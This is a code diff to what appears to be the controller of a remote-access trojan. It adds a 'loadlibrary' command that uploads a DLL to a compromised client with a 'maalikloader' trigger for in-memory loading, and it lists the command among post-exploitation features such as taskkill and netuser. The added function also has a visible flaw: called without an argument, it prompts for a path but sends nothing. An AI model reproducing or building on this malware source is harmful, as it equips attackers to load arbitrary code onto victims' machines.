@@ -221,6 +221,27 @@ class ClientManage:
                     print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
                 except Exception as e:
                     print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
+        
+        def DLLTransfer(mfile=None):
+            if(mfile == None):
+                mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] DLL Path : ")
+            else:
+                try:
+                    with open(mfile, "rb") as sendfile:
+                        data = sendfile.read()
+                        bufferst = os.stat(mfile)
+                        #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
+                        time.sleep(1)
+                        self.SendData("fdll") # Send File Receive trigger for client
+                        trigger = "maalikloader" + ":" + str(bufferst.st_size) 
+                        self.SendData(trigger) # Send Trigger
+                        self.SendBytes(data) # Send file
+                        #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
+                        self.WaitForReply()
+                except FileNotFoundError:
+                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
+                except Exception as e:
+                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
 
         while(session):
             try:
@@ -593,6 +614,10 @@ Open Ports
                     shellmode = True
                     filetransfer()
                     shellmode = False
+                elif(main == "loadlibrary"):
+                    shellmode = True
+                    DLLTransfer()
+                    shellmode = False
                 elif(main == "help"):
                     print(Style.BRIGHT + Fore.WHITE + """
                     HELP
@@ -627,7 +652,8 @@ Open Ports
                     -. taskkill - Kill Running Process.
                     -. host_sweep - Get all hostnames of scanned targets or specific IP (use -h to specify ip).
                     -. upload - Upload file.
-                    
+                    -. loadlibrary - Load library in memory.
+
                     POST Exploitation Specific 
                     ----------------------------------
                     -. netuser - List users.
